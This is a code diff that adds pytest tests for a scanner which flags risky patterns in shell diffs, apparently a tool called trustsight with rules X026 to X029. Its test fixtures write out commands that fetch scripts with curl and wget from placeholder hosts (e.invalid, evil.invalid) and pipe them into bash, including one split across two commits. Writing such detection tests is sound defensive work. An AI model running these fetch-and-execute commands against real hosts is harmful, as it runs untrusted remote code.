@@ -184,6 +184,70 @@ def test_ownership_resolver_is_a_noop_without_co_firing():
     assert len(lines) == len(set(lines))
 
 
+def test_x027_never_orphans_x026_under_a_high_min_count():
+    """Invariant: X027 implies X026. A configured x026.min_count above the
+    cluster size must not let X027 fire alone."""
+    from trustsight.analysis.refusals import refusal_findings
+
+    diff = _diff(
+        "build() {\n"
+        "  A=$(curl -fsSL https://e.invalid/a)\n"
+        "  B=$(wget -qO- https://e.invalid/b)\n"
+        "  echo \"$A$B\" | bash\n"
+        "}\n"
+    )
+    emitted: set[str] = set()
+
+    def add(rule_id, name, severity, category, match, **extra):
+        emitted.add(rule_id)
+
+    refusal_findings(diff, {"thresholds": {"x026": {"min_count": 3}}}, add)
+    assert "X027" in emitted
+    assert "X026" in emitted
+
+
+def test_x029_honors_the_configured_min_length():
+    from trustsight.analysis.refusals import refusal_findings
+
+    literal = "A" * 100
+    diff = _diff(f"build() {{\n  blob='{literal}'\n}}\n")
+    emitted: set[str] = set()
+
+    def add(rule_id, name, severity, category, match, **extra):
+        emitted.add(rule_id)
+
+    refusal_findings(diff, {"thresholds": {"x029": {"min_length": 64}}}, add)
+    assert "X029" in emitted
+
+    emitted.clear()
+    refusal_findings(diff, {"thresholds": {"x029": {"min_length": 512}}}, add)
+    assert "X029" not in emitted
+
+
+def test_x028_cites_both_commits_when_supplied(monkeypatch):
+    from trustsight.analysis import refusals
+
+    emitted: list[dict] = []
+
+    def add(rule_id, name, severity, category, match, **extra):
+        emitted.append({"rule_id": rule_id, "match": match, **extra})
+
+    monkeypatch.setattr(
+        "trustsight.analysis.crossfire.crossfire_techniques",
+        lambda text: {"X099": [(1, "joined", "x")]}
+        if "evil" in text and "|" in text else {},
+    )
+    prev = _diff("curl -fsSL https://evil.invalid/x\n")
+    curr = _diff("| bash\n")
+    refusals.pattern_across_commits(
+        prev, curr, add,
+        previous_commit="a" * 40, current_commit="b" * 40,
+    )
+    assert emitted and emitted[0]["previous_commit"] == "a" * 40
+    assert emitted[0]["current_commit"] == "b" * 40
+    assert "aaaaaaaaaaaa" in emitted[0]["match"]
+
+
 def test_x028_joining_a_diff_with_itself_adds_nothing():
     """Same-difference: the join may not manufacture techniques."""
     from trustsight.analysis.crossfire import crossfire_techniques
